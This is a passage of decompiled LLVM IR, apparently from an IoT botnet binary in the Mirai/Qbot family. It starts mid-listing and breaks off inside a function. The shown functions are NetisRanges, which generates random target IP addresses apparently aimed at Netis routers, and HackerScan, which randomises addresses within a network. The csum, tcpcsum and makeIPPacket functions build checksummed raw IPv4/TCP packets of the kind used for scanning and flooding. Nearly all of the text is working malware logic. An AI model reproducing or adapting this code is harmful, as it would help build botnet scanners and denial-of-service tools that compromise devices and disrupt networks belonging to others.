  uselistorder label %dec_label_pc_d10c, { 1, 0 }
  uselistorder label %dec_label_pc_d0d8, { 1, 0 }
  uselistorder label %dec_label_pc_d0a4, { 1, 0 }
  uselistorder label %dec_label_pc_d070, { 1, 0 }
  uselistorder label %dec_label_pc_d03c, { 1, 0 }
  uselistorder label %dec_label_pc_d008, { 1, 0 }
  uselistorder label %dec_label_pc_cfd4, { 1, 0 }
  uselistorder label %dec_label_pc_cfa0, { 1, 0 }
  uselistorder label %dec_label_pc_cf6c, { 1, 0 }
  uselistorder label %dec_label_pc_cf38, { 1, 0 }
  uselistorder label %dec_label_pc_cf04, { 1, 0 }
  uselistorder label %dec_label_pc_ced0, { 1, 0 }
  uselistorder label %dec_label_pc_ce9c, { 1, 0 }
  uselistorder label %dec_label_pc_ce68, { 1, 0 }
  uselistorder label %dec_label_pc_ce34, { 1, 0 }
  uselistorder label %dec_label_pc_ce00, { 1, 0 }
  uselistorder label %dec_label_pc_cdcc, { 1, 0 }
  uselistorder label %dec_label_pc_cd98, { 1, 0 }
  uselistorder label %dec_label_pc_cd64, { 1, 0 }
  uselistorder label %dec_label_pc_cd30, { 1, 0 }
  uselistorder label %dec_label_pc_ccfc, { 1, 0 }
  uselistorder label %dec_label_pc_ccc8, { 1, 0 }
  uselistorder label %dec_label_pc_cc94, { 1, 0 }
  uselistorder label %dec_label_pc_cc60, { 1, 0 }
  uselistorder label %dec_label_pc_cc2c, { 1, 0 }
  uselistorder label %dec_label_pc_cbf8, { 1, 0 }
  uselistorder label %dec_label_pc_cbc4, { 1, 0 }
  uselistorder label %dec_label_pc_cb90, { 1, 0 }
  uselistorder label %dec_label_pc_cb5c, { 1, 0 }
  uselistorder label %dec_label_pc_cb28, { 1, 0 }
  uselistorder label %dec_label_pc_caf4, { 1, 0 }
  uselistorder label %dec_label_pc_cac0, { 1, 0 }
  uselistorder label %dec_label_pc_ca8c, { 1, 0 }
  uselistorder label %dec_label_pc_ca58, { 1, 0 }
  uselistorder label %dec_label_pc_ca24, { 1, 0 }
  uselistorder label %dec_label_pc_c9f0, { 1, 0 }
  uselistorder label %dec_label_pc_c9bc, { 1, 0 }
  uselistorder label %dec_label_pc_c988, { 1, 0 }
  uselistorder label %dec_label_pc_c954, { 1, 0 }
  uselistorder label %dec_label_pc_c920, { 1, 0 }
  uselistorder label %dec_label_pc_c8ec, { 1, 0 }
  uselistorder label %dec_label_pc_c8b8, { 1, 0 }
  uselistorder label %dec_label_pc_c884, { 1, 0 }
  uselistorder label %dec_label_pc_c850, { 1, 0 }
  uselistorder label %dec_label_pc_c81c, { 1, 0 }
  uselistorder label %dec_label_pc_c7e8, { 1, 0 }
  uselistorder label %dec_label_pc_c7b4, { 1, 0 }
  uselistorder label %dec_label_pc_c780, { 1, 0 }
  uselistorder label %dec_label_pc_c74c, { 1, 0 }
  uselistorder label %dec_label_pc_c718, { 1, 0 }
  uselistorder label %dec_label_pc_c6e4, { 1, 0 }
  uselistorder label %dec_label_pc_c6b0, { 1, 0 }
  uselistorder label %dec_label_pc_c67c, { 1, 0 }
  uselistorder label %dec_label_pc_c648, { 1, 0 }
  uselistorder label %dec_label_pc_c614, { 1, 0 }
  uselistorder label %dec_label_pc_c5e0, { 1, 0 }
  uselistorder label %dec_label_pc_c5ac, { 1, 0 }
  uselistorder label %dec_label_pc_c578, { 1, 0 }
  uselistorder label %dec_label_pc_c544, { 1, 0 }
  uselistorder label %dec_label_pc_c510, { 1, 0 }
  uselistorder label %dec_label_pc_c4dc, { 1, 0 }
  uselistorder label %dec_label_pc_c4a8, { 1, 0 }
  uselistorder label %dec_label_pc_c474, { 1, 0 }
  uselistorder label %dec_label_pc_c440, { 1, 0 }
  uselistorder label %dec_label_pc_c40c, { 1, 0 }
  uselistorder label %dec_label_pc_c3d8, { 1, 0 }
  uselistorder label %dec_label_pc_c3a4, { 1, 0 }
  uselistorder label %dec_label_pc_c370, { 1, 0 }
  uselistorder label %dec_label_pc_c33c, { 1, 0 }
  uselistorder label %dec_label_pc_c308, { 1, 0 }
  uselistorder label %dec_label_pc_c2d4, { 1, 0 }
  uselistorder label %dec_label_pc_c2a0, { 1, 0 }
  uselistorder label %dec_label_pc_c26c, { 1, 0 }
  uselistorder label %dec_label_pc_c238, { 1, 0 }
  uselistorder label %dec_label_pc_c204, { 1, 0 }
  uselistorder label %dec_label_pc_c1d0, { 1, 0 }
  uselistorder label %dec_label_pc_c19c, { 1, 0 }
  uselistorder label %dec_label_pc_c168, { 1, 0 }
  uselistorder label %dec_label_pc_c134, { 1, 0 }
  uselistorder label %dec_label_pc_c100, { 1, 0 }
  uselistorder label %dec_label_pc_c0cc, { 1, 0 }
  uselistorder label %dec_label_pc_c098, { 1, 0 }
  uselistorder label %dec_label_pc_c064, { 1, 0 }
  uselistorder label %dec_label_pc_c030, { 1, 0 }
  uselistorder label %dec_label_pc_bffc, { 1, 0 }
  uselistorder label %dec_label_pc_bfc8, { 1, 0 }
  uselistorder label %dec_label_pc_bf94, { 1, 0 }
  uselistorder label %dec_label_pc_bf60, { 1, 0 }
  uselistorder label %dec_label_pc_bf2c, { 1, 0 }
  uselistorder label %dec_label_pc_bef8, { 1, 0 }
  uselistorder label %dec_label_pc_bec4, { 1, 0 }
  uselistorder label %dec_label_pc_be90, { 1, 0 }
  uselistorder label %dec_label_pc_be5c, { 1, 0 }
  uselistorder label %dec_label_pc_be28, { 1, 0 }
  uselistorder label %dec_label_pc_bdf4, { 1, 0 }
  uselistorder label %dec_label_pc_bdc0, { 1, 0 }
  uselistorder label %dec_label_pc_bd8c, { 1, 0 }
  uselistorder label %dec_label_pc_bd58, { 1, 0 }
  uselistorder label %dec_label_pc_bd24, { 1, 0 }
  uselistorder label %dec_label_pc_bcf0, { 1, 0 }
  uselistorder label %dec_label_pc_bcbc, { 1, 0 }
  uselistorder label %dec_label_pc_bc88, { 1, 0 }
  uselistorder label %dec_label_pc_bc54, { 1, 0 }
  uselistorder label %dec_label_pc_bc20, { 1, 0 }
  uselistorder label %dec_label_pc_bbec, { 1, 0 }
  uselistorder label %dec_label_pc_bbb8, { 1, 0 }
  uselistorder label %dec_label_pc_bb84, { 1, 0 }
  uselistorder label %dec_label_pc_bb50, { 1, 0 }
  uselistorder label %dec_label_pc_bb1c, { 1, 0 }
  uselistorder label %dec_label_pc_bae8, { 1, 0 }
  uselistorder label %dec_label_pc_bab4, { 1, 0 }
  uselistorder label %dec_label_pc_ba80, { 1, 0 }
  uselistorder label %dec_label_pc_ba4c, { 1, 0 }
  uselistorder label %dec_label_pc_ba18, { 1, 0 }
  uselistorder label %dec_label_pc_b9e4, { 1, 0 }
  uselistorder label %dec_label_pc_b9b0, { 1, 0 }
  uselistorder label %dec_label_pc_b97c, { 1, 0 }
  uselistorder label %dec_label_pc_b948, { 1, 0 }
  uselistorder label %dec_label_pc_b6c4, { 1, 0 }
  uselistorder label %dec_label_pc_b690, { 1, 0 }
  uselistorder label %dec_label_pc_b65c, { 1, 0 }
  uselistorder label %dec_label_pc_b628, { 1, 0 }
  uselistorder label %dec_label_pc_b5f4, { 1, 0 }
  uselistorder label %dec_label_pc_b5c0, { 1, 0 }
  uselistorder label %dec_label_pc_b58c, { 1, 0 }
  uselistorder label %dec_label_pc_b558, { 1, 0 }
  uselistorder label %dec_label_pc_b524, { 1, 0 }
  uselistorder label %dec_label_pc_b4f0, { 1, 0 }
  uselistorder label %dec_label_pc_b4bc, { 1, 0 }
  uselistorder label %dec_label_pc_b488, { 1, 0 }
  uselistorder label %dec_label_pc_b454, { 1, 0 }
  uselistorder label %dec_label_pc_b420, { 1, 0 }
  uselistorder label %dec_label_pc_b3ec, { 1, 0 }
  uselistorder label %dec_label_pc_b3b8, { 1, 0 }
  uselistorder label %dec_label_pc_b384, { 1, 0 }
  uselistorder label %dec_label_pc_b350, { 1, 0 }
  uselistorder label %dec_label_pc_b31c, { 1, 0 }
  uselistorder label %dec_label_pc_b2e8, { 1, 0 }
  uselistorder label %dec_label_pc_b2b4, { 1, 0 }
  uselistorder label %dec_label_pc_b280, { 1, 0 }
  uselistorder label %dec_label_pc_b24c, { 1, 0 }
  uselistorder label %dec_label_pc_b218, { 1, 0 }
  uselistorder label %dec_label_pc_b1e4, { 1, 0 }
  uselistorder label %dec_label_pc_b1b0, { 1, 0 }
  uselistorder label %dec_label_pc_b17c, { 1, 0 }
  uselistorder label %dec_label_pc_b148, { 1, 0 }
  uselistorder label %dec_label_pc_b114, { 1, 0 }
  uselistorder label %dec_label_pc_b0e0, { 1, 0 }
  uselistorder label %dec_label_pc_b0ac, { 1, 0 }
  uselistorder label %dec_label_pc_b078, { 1, 0 }
  uselistorder label %dec_label_pc_b044, { 1, 0 }
  uselistorder label %dec_label_pc_b010, { 1, 0 }
  uselistorder label %dec_label_pc_afdc, { 1, 0 }
  uselistorder label %dec_label_pc_afa8, { 1, 0 }
  uselistorder label %dec_label_pc_af74, { 1, 0 }
  uselistorder label %dec_label_pc_af40, { 1, 0 }
  uselistorder label %dec_label_pc_af0c, { 1, 0 }
  uselistorder label %dec_label_pc_aed8, { 1, 0 }
  uselistorder label %dec_label_pc_aea4, { 1, 0 }
  uselistorder label %dec_label_pc_ae70, { 1, 0 }
  uselistorder label %dec_label_pc_ae3c, { 1, 0 }
  uselistorder label %dec_label_pc_ae08, { 1, 0 }
  uselistorder label %dec_label_pc_add4, { 1, 0 }
  uselistorder label %dec_label_pc_ada0, { 1, 0 }
  uselistorder label %dec_label_pc_ad6c, { 1, 0 }
  uselistorder label %dec_label_pc_ad38, { 1, 0 }
  uselistorder label %dec_label_pc_ad04, { 1, 0 }
  uselistorder label %dec_label_pc_acd0, { 1, 0 }
  uselistorder label %dec_label_pc_ac9c, { 1, 0 }
  uselistorder label %dec_label_pc_ac68, { 1, 0 }
  uselistorder label %dec_label_pc_ac34, { 1, 0 }
  uselistorder label %dec_label_pc_ac00, { 1, 0 }
  uselistorder label %dec_label_pc_abcc, { 1, 0 }
  uselistorder label %dec_label_pc_ab98, { 1, 0 }
  uselistorder label %dec_label_pc_ab64, { 1, 0 }
  uselistorder label %dec_label_pc_ab30, { 1, 0 }
  uselistorder label %dec_label_pc_aafc, { 1, 0 }
  uselistorder label %dec_label_pc_aac8, { 1, 0 }
  uselistorder label %dec_label_pc_aa94, { 1, 0 }
  uselistorder label %dec_label_pc_aa60, { 1, 0 }
  uselistorder label %dec_label_pc_aa2c, { 1, 0 }
  uselistorder label %dec_label_pc_a9f8, { 1, 0 }
  uselistorder label %dec_label_pc_a9c4, { 1, 0 }
  uselistorder label %dec_label_pc_a990, { 1, 0 }
  uselistorder label %dec_label_pc_a95c, { 1, 0 }
  uselistorder label %dec_label_pc_a928, { 1, 0 }
  uselistorder label %dec_label_pc_a8f4, { 1, 0 }
  uselistorder label %dec_label_pc_a8c0, { 1, 0 }
  uselistorder label %dec_label_pc_a88c, { 1, 0 }
  uselistorder label %dec_label_pc_a858, { 1, 0 }
  uselistorder label %dec_label_pc_a824, { 1, 0 }
}

define i32 @NetisRanges() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_d5b4 = load i32, i32* @r4, align 4
  %v6_d5b4 = load i32, i32* @fp, align 4
  store i32 54716, i32* %stack_var_-4, align 4
  %v2_d5b8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_d5b8, i32* @fp, align 4
  %v0_d5c0 = call i32 @random()
  %v2_d5d0 = urem i32 %v0_d5c0, 57
  %v4_d5e4 = mul nuw nsw i32 %v2_d5d0, 4
  %v5_d5e4 = add i32 %v4_d5e4, ptrtoint (i32* @global_var_287e0.473 to i32)
  %v6_d5e4 = inttoptr i32 %v5_d5e4 to i32*
  %v7_d5e4 = load i32, i32* %v6_d5e4, align 4
  %v1_d5f0 = trunc i32 %v7_d5e4 to i8
  store i8 %v1_d5f0, i8* @global_var_28c57.68, align 1
  %v0_d5f4 = call i32 @random()
  %v2_d604 = srem i32 %v0_d5f4, 255
  %v1_d614 = trunc i32 %v2_d604 to i8
  store i8 %v1_d614, i8* @global_var_28c58.69, align 1
  %v0_d618 = call i32 @random()
  %v2_d628 = srem i32 %v0_d618, 255
  %v1_d638 = trunc i32 %v2_d628 to i8
  store i8 %v1_d638, i8* @global_var_28c59.70, align 1
  %v0_d63c = call i32 @random()
  %v2_d64c = srem i32 %v0_d63c, 255
  %v1_d65c = trunc i32 %v2_d64c to i8
  store i8 %v1_d65c, i8* @global_var_28c5a.71, align 1
  %v2_d660 = ptrtoint i32* %stack_var_-40 to i32
  store i32 0, i32* %stack_var_-40, align 4
  %v2_d69c = load i8, i8* bitcast (i8** @global_var_28c56.67 to i8*), align 4
  %v3_d69c = zext i8 %v2_d69c to i32
  store i32 %v3_d69c, i32* @lr, align 4
  %v3_d6a8 = load i8, i8* @global_var_28c57.68, align 1
  %v4_d6a8 = zext i8 %v3_d6a8 to i32
  store i32 %v4_d6a8, i32* @r4, align 4
  %v3_d6b4 = load i8, i8* @global_var_28c58.69, align 1
  %v6_d6dc = sext i8 %v3_d6a8 to i32
  %v8_d6dc = sext i8 %v3_d6b4 to i32
  %v9_d6dc = call i32 @szprintf(i32 %v2_d660, i32 ptrtoint ([12 x i8]* @global_var_1d004.476 to i32), i32 %v3_d69c, i32 %v6_d6dc, i32 %v8_d6dc)
  store i32 %v2_d660, i32* @r0, align 4
  %v1_d6e8 = call i32 @inet_addr(i32 %v2_d660)
  store i32 %v3_d5b4, i32* @r4, align 4
  store i32 %v6_d5b4, i32* @fp, align 4
  ret i32 %v1_d6e8

; uselistorder directives
  uselistorder i32 %v2_d660, { 2, 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* @global_var_28c5a.71, { 210, 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_28c59.70, { 210, 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_28c58.69, { 3, 2, 1, 0 }
  uselistorder i8* @global_var_28c57.68, { 3, 2, 1, 0 }
  uselistorder i32 110, { 1, 0 }
}

define i32 @HackerScan(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_d720 = load i32, i32* @global_var_2eebc.478, align 4
  %v1_d728 = call i32 @ntohl(i32 %v2_d720)
  %v2_d734 = and i32 %v1_d728, %arg1
  %v0_d73c = call i32 @rand_cmwc()
  %v1_d748 = sub i32 -1, %arg1
  %v2_d74c = and i32 %v0_d73c, %v1_d748
  %v2_d754 = xor i32 %v2_d74c, %v2_d734
  ret i32 %v2_d754

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @csum(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v8_d7e49 = icmp sgt i32 %arg2, 1
  br i1 %v8_d7e49, label %dec_label_pc_d794, label %dec_label_pc_d7e8

dec_label_pc_d794:                                ; preds = %entry, %dec_label_pc_d794
  %v2_d7b0 = phi i32 [ %v2_d7b4, %dec_label_pc_d794 ], [ 0, %entry ]
  %stack_var_-40.012 = phi i32 [ %v5_d7b8, %dec_label_pc_d794 ], [ 0, %entry ]
  %stack_var_-36.011 = phi i32 [ %v1_d7d4, %dec_label_pc_d794 ], [ %arg2, %entry ]
  %stack_var_-32.010 = phi i8* [ %v5_d7cc, %dec_label_pc_d794 ], [ %arg1, %entry ]
  %v4_d794 = ptrtoint i8* %stack_var_-32.010 to i32
  %v2_d798 = load i8, i8* %stack_var_-32.010, align 1
  %v3_d798 = zext i8 %v2_d798 to i32
  %v1_d79c = add i32 %v4_d794, 1
  %v2_d79c = inttoptr i32 %v1_d79c to i8*
  %v3_d79c = load i8, i8* %v2_d79c, align 1
  %v4_d79c = zext i8 %v3_d79c to i32
  %v4_d7a0 = mul nuw nsw i32 %v4_d79c, 256
  %v5_d7a0 = or i32 %v4_d7a0, %v3_d798
  %v2_d7b4 = add i32 %v5_d7a0, %v2_d7b0
  %v3_d7b4 = icmp ult i32 %v2_d7b4, %v2_d7b0
  %v4_d7b8 = zext i1 %v3_d7b4 to i32
  %v5_d7b8 = add i32 %v4_d7b8, %stack_var_-40.012
  %v1_d7c8 = add i32 %v4_d794, 2
  %v5_d7cc = inttoptr i32 %v1_d7c8 to i8*
  %v1_d7d4 = add nsw i32 %stack_var_-36.011, -2
  %v8_d7e4 = icmp sgt i32 %v1_d7d4, 1
  br i1 %v8_d7e4, label %dec_label_pc_d794, label %dec_label_pc_d7e8

dec_label_pc_d7e8:                                ; preds = %dec_label_pc_d794, %entry
  %v2_d808 = phi i32 [ 0, %entry ], [ %v2_d7b4, %dec_label_pc_d794 ]
  %stack_var_-32.0.lcssa = phi i8* [ %arg1, %entry ], [ %v5_d7cc, %dec_label_pc_d794 ]
  %stack_var_-40.0.lcssa = phi i32 [ 0, %entry ], [ %v5_d7b8, %dec_label_pc_d794 ]
  %v7_d7e0.lcssa.in = phi i32 [ %arg2, %entry ], [ %v1_d7d4, %dec_label_pc_d794 ]
  %v7_d7e0.lcssa = icmp eq i32 %v7_d7e0.lcssa.in, 1
  br i1 %v7_d7e0.lcssa, label %dec_label_pc_d7f4, label %dec_label_pc_d870.preheader

dec_label_pc_d7f4:                                ; preds = %dec_label_pc_d7e8
  %v2_d7f8 = load i8, i8* %stack_var_-32.0.lcssa, align 1
  %v3_d7f8 = zext i8 %v2_d7f8 to i32
  %v2_d80c = add i32 %v3_d7f8, %v2_d808
  %v3_d80c = icmp ult i32 %v2_d80c, %v2_d808
  %v4_d810 = zext i1 %v3_d80c to i32
  %v5_d810 = add i32 %v4_d810, %stack_var_-40.0.lcssa
  br label %dec_label_pc_d870.preheader

dec_label_pc_d870.preheader:                      ; preds = %dec_label_pc_d7f4, %dec_label_pc_d7e8
  %v3_d89c.ph = phi i32 [ %v2_d808, %dec_label_pc_d7e8 ], [ %v2_d80c, %dec_label_pc_d7f4 ]
  %stack_var_-40.1.ph = phi i32 [ %stack_var_-40.0.lcssa, %dec_label_pc_d7e8 ], [ %v5_d810, %dec_label_pc_d7f4 ]
  %v3_d87436 = mul i32 %stack_var_-40.1.ph, 65536
  %v3_d87c37 = udiv i32 %v3_d89c.ph, 65536
  %v2_d88038 = or i32 %v3_d87436, %v3_d87c37
  %v3_d88839 = udiv i32 %stack_var_-40.1.ph, 65536
  %v2_d89040 = or i32 %v2_d88038, %v3_d88839
  %v2_d89441 = icmp eq i32 %v2_d89040, 0
  br i1 %v2_d89441, label %dec_label_pc_d89c, label %dec_label_pc_d820

dec_label_pc_d820:                                ; preds = %dec_label_pc_d870.preheader, %dec_label_pc_d820
  %v3_d88844 = phi i32 [ %v3_d888, %dec_label_pc_d820 ], [ %v3_d88839, %dec_label_pc_d870.preheader ]
  %v2_d88043 = phi i32 [ %v2_d880, %dec_label_pc_d820 ], [ %v2_d88038, %dec_label_pc_d870.preheader ]
  %v3_d89c42 = phi i32 [ %v2_d860, %dec_label_pc_d820 ], [ %v3_d89c.ph, %dec_label_pc_d870.preheader ]
  %v2_d834 = urem i32 %v3_d89c42, 65536
  %v2_d860 = add i32 %v2_d88043, %v2_d834
  %v3_d860 = icmp ult i32 %v2_d860, %v2_d834
  %v4_d864 = zext i1 %v3_d860 to i32
  %v5_d864 = add nuw nsw i32 %v4_d864, %v3_d88844
  %v3_d874 = mul i32 %v5_d864, 65536
  %v3_d87c = udiv i32 %v2_d860, 65536
  %v2_d880 = or i32 %v3_d874, %v3_d87c
  %v3_d888 = udiv i32 %v5_d864, 65536
  %v2_d890 = or i32 %v2_d880, %v3_d888
  %v2_d894 = icmp eq i32 %v2_d890, 0
  br i1 %v2_d894, label %dec_label_pc_d870.dec_label_pc_d89c_crit_edge, label %dec_label_pc_d820

dec_label_pc_d870.dec_label_pc_d89c_crit_edge:    ; preds = %dec_label_pc_d820
  br label %dec_label_pc_d89c

dec_label_pc_d89c:                                ; preds = %dec_label_pc_d870.dec_label_pc_d89c_crit_edge, %dec_label_pc_d870.preheader
  %v3_d89c.lcssa = phi i32 [ %v2_d860, %dec_label_pc_d870.dec_label_pc_d89c_crit_edge ], [ %v3_d89c.ph, %dec_label_pc_d870.preheader ]
  %v1_d8a8 = urem i32 %v3_d89c.lcssa, 65536
  %v3_d8b0 = xor i32 %v1_d8a8, 65535
  ret i32 %v3_d8b0

; uselistorder directives
  uselistorder i32 %v2_d880, { 1, 0 }
  uselistorder i32 %v5_d864, { 1, 0 }
  uselistorder i32 %v2_d860, { 2, 0, 3, 1 }
  uselistorder i32 %v3_d88839, { 1, 0 }
  uselistorder i32 %stack_var_-40.1.ph, { 1, 0 }
  uselistorder i32 %v3_d89c.ph, { 2, 1, 0 }
  uselistorder i32 %v2_d808, { 0, 2, 1 }
  uselistorder i32 %v1_d7d4, { 0, 2, 1 }
  uselistorder i32 %v2_d7b4, { 0, 2, 1 }
  uselistorder i32 %v2_d7b0, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_d820, { 1, 0 }
  uselistorder label %dec_label_pc_d794, { 1, 0 }
}

define i32 @tcpcsum(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_d8c4 = load i32, i32* @fp, align 4
  store i32 %arg2, i32* %stack_var_-52, align 4
  %v1_d8fc = add i32 %arg1, 12
  %v2_d8fc = inttoptr i32 %v1_d8fc to i32*
  %v3_d8fc = load i32, i32* %v2_d8fc, align 4
  store i32 %v3_d8fc, i32* %stack_var_-44, align 4
  %v1_d924 = call i32 @htons(i32 20)
  %v1_d948 = call i32 @malloc(i32 32)
  %v2_d958 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v1_d948, i32* @r0, align 4
  store i32 %v2_d958, i32* @r1, align 4
  store i32 12, i32* @r2, align 4
  %v0_d96c = call i32 @memcpy()
  %v1_d974 = add i32 %v1_d948, 12
  %v3_d978 = load i32, i32* %stack_var_-52, align 4
  store i32 %v1_d974, i32* @r0, align 4
  store i32 %v3_d978, i32* @r1, align 4
  store i32 20, i32* @r2, align 4
  %v0_d98c = call i32 @memcpy()
  %v2_d998 = inttoptr i32 %v1_d948 to i8*
  %v3_d998 = call i32 @csum(i8* %v2_d998, i32 32)
  %sext2 = mul i32 %v3_d998, 16777216
  %v3_d9a4 = ashr i32 %sext2, 31
  %v1_d9b0 = call i32 @free(i32 %v1_d948)
  %v3_d9b8 = sdiv i32 %sext2, 16777216
  %v4_d9bc = mul nsw i32 %v3_d9a4, 256
  %v4_d9c0 = and i32 %v4_d9bc, 65280
  %v5_d9c0 = or i32 %v4_d9c0, %v3_d9b8
  store i32 %v3_d8c4, i32* @fp, align 4
  ret i32 %v5_d9c0

; uselistorder directives
  uselistorder i32 %sext2, { 1, 0 }
  uselistorder i32 %v1_d948, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
}

define i32 @makeIPPacket(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = trunc i32 %arg4 to i8
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp4 = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %v3_d9d4 = load i32, i32* @fp, align 4
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  %v2_d9f4 = load i8, i8* %arg1, align 1
  %v4_d9fc = zext i8 %v2_d9f4 to i32
  %v1_da00 = and i32 %v4_d9fc, 240
  %v1_da04 = or i32 %v1_da00, 5
  store i32 %v1_da04, i32* %r3.global-to-local, align 4
  %v1_da10 = trunc i32 %v1_da04 to i8
  store i8 %v1_da10, i8* %arg1, align 1
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  store i8 69, i8* %arg1, align 1
  %v3_da40 = add i32 %tmp4, 1
  %v4_da40 = inttoptr i32 %v3_da40 to i8*
  store i8 0, i8* %v4_da40, align 1
  %v3_da44 = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_da44, 20
  %v3_da58 = urem i32 %fold, 65536
  store i32 %v3_da58, i32* %r3.global-to-local, align 4
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  %v1_da60 = trunc i32 %fold to i8
  %v3_da60 = add i32 %tmp4, 2
  %v4_da60 = inttoptr i32 %v3_da60 to i8*
  store i8 %v1_da60, i8* %v4_da60, align 1
  %v0_da64 = load i32, i32* %r3.global-to-local, align 4
  %v3_da64 = sdiv i32 %v0_da64, 256
  store i32 %v3_da64, i32* %r3.global-to-local, align 4
  %v1_da68 = trunc i32 %v3_da64 to i8
  %v2_da68 = load i32, i32* %r2.global-to-local, align 4
  %v3_da68 = add i32 %v2_da68, 3
  %v4_da68 = inttoptr i32 %v3_da68 to i8*
  store i8 %v1_da68, i8* %v4_da68, align 1
  %v0_da6c = call i32 @rand_cmwc()
  %v3_da78 = urem i32 %v0_da6c, 65536
  store i32 %v3_da78, i32* %r3.global-to-local, align 4
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  %v1_da80 = trunc i32 %v0_da6c to i8
  %v3_da80 = add i32 %tmp4, 4
  %v4_da80 = inttoptr i32 %v3_da80 to i8*
  store i8 %v1_da80, i8* %v4_da80, align 1
  %v0_da84 = load i32, i32* %r3.global-to-local, align 4
  %v3_da843 = udiv i32 %v0_da84, 256
  %v1_da88 = trunc i32 %v3_da843 to i8
  %v2_da88 = load i32, i32* %r2.global-to-local, align 4
  %v3_da88 = add i32 %v2_da88, 5
  %v4_da88 = inttoptr i32 %v3_da88 to i8*
  store i8 %v1_da88, i8* %v4_da88, align 1
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_da94 = add i32 %tmp4, 6
  %v4_da94 = inttoptr i32 %v3_da94 to i8*
  store i8 0, i8* %v4_da94, align 1
  %v0_da98 = load i32, i32* %r3.global-to-local, align 4
  %v1_da98 = trunc i32 %v0_da98 to i8
  %v2_da98 = load i32, i32* %r2.global-to-local, align 4
  %v3_da98 = add i32 %v2_da98, 7
  %v4_da98 = inttoptr i32 %v3_da98 to i8*
  store i8 %v1_da98, i8* %v4_da98, align 1
  %v3_daa4 = add i32 %tmp4, 8
  %v4_daa4 = inttoptr i32 %v3_daa4 to i8*
  store i8 -1, i8* %v4_daa4, align 1
  %v3_dab0 = add i32 %tmp4, 9
  %v4_dab0 = inttoptr i32 %v3_dab0 to i8*
  store i8 %tmp, i8* %v4_dab0, align 1
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_dabc = add i32 %tmp4, 10
  %v4_dabc = inttoptr i32 %v3_dabc to i8*
  store i8 0, i8* %v4_dabc, align 1
  %v0_dac0 = load i32, i32* %r3.global-to-local, align 4
  %v1_dac0 = trunc i32 %v0_dac0 to i8
  %v2_dac0 = load i32, i32* %r2.global-to-local, align 4
  %v3_dac0 = add i32 %v2_dac0, 11
  %v4_dac0 = inttoptr i32 %v3_dac0 to i8*
  store i8 %v1_dac0, i8* %v4_dac0, align 1
  %v2_dacc = add i32 %tmp4, 12
  %v3_dacc = inttoptr i32 %v2_dacc to i32*
